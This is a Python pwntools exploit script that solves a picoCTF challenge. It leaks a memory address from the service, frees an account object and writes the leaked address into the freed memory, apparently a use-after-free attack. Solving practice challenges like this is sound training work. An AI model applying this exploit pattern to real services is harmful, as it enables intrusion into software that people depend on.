from distutils.debug import DEBUG
from pwn import *

log.setLevel(10)

MEMORY_LINE = "OOP! Memory leak..."
END_MENU_LINE = "(e)xit\n"
s = ""

r = remote('mercury.picoctf.net', 6312)
#r.recvuntil("(e)xit\n")
r.recvuntil(END_MENU_LINE)

def subscribe():
    r.send("s\n")
    mem_addr= r.recvline().decode('utf-8').replace(MEMORY_LINE, "").strip()
    print(mem_addr)
    result = int(mem_addr, 16)
    r.recvuntil(END_MENU_LINE)

    return result

def delete_account():
    r.send("i\n")
    r.recvuntil("You're leaving already(Y/N)?\n")
    r.send("y\n")
    r.recvuntil(END_MENU_LINE)

def leave_message(msg):
    r.send("l\n")
    r.recvuntil("try anyways:\n")
    r.send(msg)

leaked_addr = subscribe()
delete_account()
payload = p32(leaked_addr) + p32(0)
leave_message(payload)
print(r.recvline())
exit()